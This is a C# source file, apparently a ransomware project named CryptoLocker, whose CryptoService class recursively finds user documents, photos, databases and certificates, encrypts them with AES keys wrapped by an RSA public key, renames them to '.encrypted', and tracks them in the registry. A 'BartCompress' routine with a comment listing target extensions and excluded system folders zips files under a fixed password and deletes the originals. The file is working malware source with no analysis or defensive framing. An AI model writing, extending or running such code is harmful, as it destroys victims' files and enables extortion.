using System;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Ionic.Zip;

namespace CryptoLocker.Logic
{
    public class CryptoService
    {
        private const string SearchPattern =
            @"*.odt|*.ods|*.odp|*.odm|*.odc|*.odb|*.doc|*.docx|*.docm|*.wps|*.xls|*.xlsx|*.xlsm|*.xlsb|*.xlk|*.ppt|*.pptx|*.pptm|*.mdb|*.accdb|*.pst|*.dwg|*.dxf|*.dxg|*.wpd|*.rtf|*.wb2|*.mdf|*.dbf|*.psd|*.pdd|*.pdf|*.eps|*.ai|*.indd|*.cdr|*.jpg|*.jpe|*.jpg|*.dng|*.3fr|*.arw|*.srf|*.sr2|*.bay|*.crw|*.cr2|*.dcr|*.kdc|*.erf|*.mef|*.mrw|*.nef|*.nrw|*.orf|*.raf|*.raw|*.rwl|*.rw2|*.r3d|*.ptx|*.pef|*.srw|*.x3f|*.der|*.cer|*.crt|*.pem|*.pfx|*.p12|*.p7b|*.p7c|*.png";

        public static void EncryptFiles(string path, string publicKey)
        {
            try
            {
                string[] files = Util.GetFiles(path, SearchPattern, SearchOption.AllDirectories).ToArray();

                Console.WriteLine("Estimate finishing in {0} seconds", 0.040 * files.Length);

                var pwd = Util.GetRandomString();

                foreach (var filePath in files)
                {
                    EncryptFile(filePath, publicKey, pwd);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }

        public static void DecryptFiles(string path, string privateKey)
        {
            try
            {
                string[] files = RegistryHelper.GetSubKeyFileNames().Select(x => x.Key).ToArray();
                
                if(files.Length == 0)
                {
                    files = Util.GetFiles(path, "*.encrypted", SearchOption.AllDirectories)
                    .ToArray();
                }
                
                foreach (var filePath in files)
                {
                    DecryptFile(filePath, privateKey);

                    Console.WriteLine("Decrypted {0}", filePath);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }

        public static void EncryptFile(string filePath, string publicKey, string password = "")
        {
            try
            {
                if(!File.Exists(filePath)) return;

                string ext = Path.GetExtension(filePath);

                if(ext == null) return;
                
                if(string.IsNullOrEmpty(password)) password = Util.GetRandomString();

                byte[] bytesToBeEncrypted = File.ReadAllBytes(filePath);
                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

                // Hash the password with SHA256
                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
                
                // Prepend salt
                byte[] salt = Util.GetFileExtensionBytes(filePath);
                if (salt == null)
                {
                    return;
                }

                byte[] baEncrypted = new byte[salt.Length + bytesToBeEncrypted.Length];

                // Combine Salt + Text
                Array.Copy(salt, 0, baEncrypted, 0, salt.Length);
                Array.Copy(bytesToBeEncrypted, 0, baEncrypted, salt.Length, bytesToBeEncrypted.Length);
                
                byte[] bytesEncrypted = Cryptography.AES_Encrypt(baEncrypted, passwordBytes);

                // RSA
                byte[] keybytes = Cryptography.RsaEncrypt(publicKey, password);
                
                // Place rsa key in front of encrypted bytes
                byte[] concatenatedBytes = keybytes.Concat(bytesEncrypted).ToArray();

                var newPath = Path.ChangeExtension(filePath, ".encrypted");
            
                File.Move(filePath, newPath);
                File.WriteAllBytes(newPath, concatenatedBytes);

                RegistryHelper.InsertFileName(filePath, Path.GetFileName(filePath));
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }

        public static void DecryptFile(string filePath, string privateKey)
        {
            try
            {
                var path = Path.ChangeExtension(filePath, ".encrypted");

                if (!File.Exists(path)) return;

                byte[] bytesToBeDecrypted = File.ReadAllBytes(path);

                // First 128 bytes is rsa key bytes
                byte[] rsaBytes = new byte[128];
                Array.Copy(bytesToBeDecrypted, 0, rsaBytes, 0, rsaBytes.Length);

                // Symmetric Rijndael key
                var symmetricKey = Cryptography.RsaDecrypt(privateKey, rsaBytes);

                byte[] extensionAndDataBytes = new byte[bytesToBeDecrypted.Length - rsaBytes.Length];
                Array.Copy(bytesToBeDecrypted, rsaBytes.Length, extensionAndDataBytes, 0, extensionAndDataBytes.Length);
                
                byte[] passwordBytes = Encoding.UTF8.GetBytes(symmetricKey);
                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
                
                // Decrypt using Rijndal/AES
                byte[] bytesDecrypted = Cryptography.AES_Decrypt(extensionAndDataBytes, passwordBytes);
            
                // Remove salt
                int saltLength = Util.GetSaltLength();
                byte[] baResult = new byte[bytesDecrypted.Length - saltLength];
                Array.Copy(bytesDecrypted, saltLength, baResult, 0, baResult.Length);
                
                // Get extension from salt
                byte[] saltedBytes = new byte[saltLength];
                Array.Copy(bytesDecrypted, 0, saltedBytes, 0, saltedBytes.Length);
                var ext = Util.ExtractFileExtensionFromBytes(saltedBytes);
            
                File.WriteAllBytes(path, baResult);
                File.Move(path, Path.ChangeExtension(path, ext));
                
                RegistryHelper.RemoveFile(filePath);

            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }

        public static void BartCompress(string filePath)
        {
            /*
             * Except
             * tmp, winnt, Application Data, AppData, PerfLogs, Program Files (x86), Program Files, ProgramData, temp, Recovery, $Recycle.Bin, System Volume Information, Boot, Windows
             * 
             * 
             * target files:
             * .n64, .m4u, .m3u, .mid, .wma, .flv, .3g2, .mkv, .3gp, .mp4, .mov, .avi, .asf, .mpeg, .vob, .mpg, .wmv, .fla, .swf, .wav, .mp3, .qcow2, .vdi, .vmdk, .vmx, .gpg, .aes, .ARC, .PAQ, .tar.bz2, .tbk, .bak, .tar, .tgz, .gz, .7z, .rar, .zip, .djv, .djvu, .svg, .bmp, .png, .gif, .raw, .cgm, .jpeg, .jpg, .tif, .tiff, .NEF, .psd, .cmd, .bat, .sh, .class, .jar, .java, .rb, .asp, .cs, .brd, .sch, .dch, .dip, .vbs, .vb, .js, .asm, .pas, .cpp, .php, .ldf, .mdf, .ibd, .MYI, .MYD, .frm, .odb, .dbf, .db, .mdb, .sq, .SQLITEDB, .SQLITE3, .asc, .lay6, .lay, .ms11(Security copy), .ms11, .sldm, .sldx, .ppsm, .ppsx, .ppam, .docb, .mm, .sxm, .otg, .odg, .uop, .potx, .potm, .pptx, .pptm, .std, .sxd, .pot, .pps, .sti, .sxi, .otp, .odp, .wb2, .123, .wks, .wk1, .xltx, .xltm, .xlsx, .xlsm, .xlsb, .slk, .xlw, .xlt, .xlm, .xlc, .dif, .stc, .sxc, .ots, .ods, .hwp, .602, .dotm, .dotx, .docm, .docx, .DOT, .3dm, .max, .3ds, .xm, .txt, .CSV, .uot, .RTF, .pdf, .XLS, .PPT, .stw, .sxw, .ott, .odt, .DOC, .pem, .p12, .csr, .crt, .key
             * 
             * */

            FileInfo file = new FileInfo(filePath);
            if(!file.Exists) return;

            var randomSalt = Util.GetRandomString(6);

            using (ZipFile zip = new ZipFile())
            {
                zip.Password = "123456";
                zip.Encryption = EncryptionAlgorithm.WinZipAes256;
                zip.AddFile(filePath, "");
                zip.Save("C:\\temp\\email.eml.bart.zip");
            }

            File.Delete(filePath);
        }
         
        public static void BartDecompress(string path)
        {
            ZipFile zip = ZipFile.Read(path);
            foreach (ZipEntry entry in zip)
            {
                entry.ExtractWithPassword("C:\\temp\\", 
                    ExtractExistingFileAction.OverwriteSilently, 
                    "123456");
            }
        }
    }
}

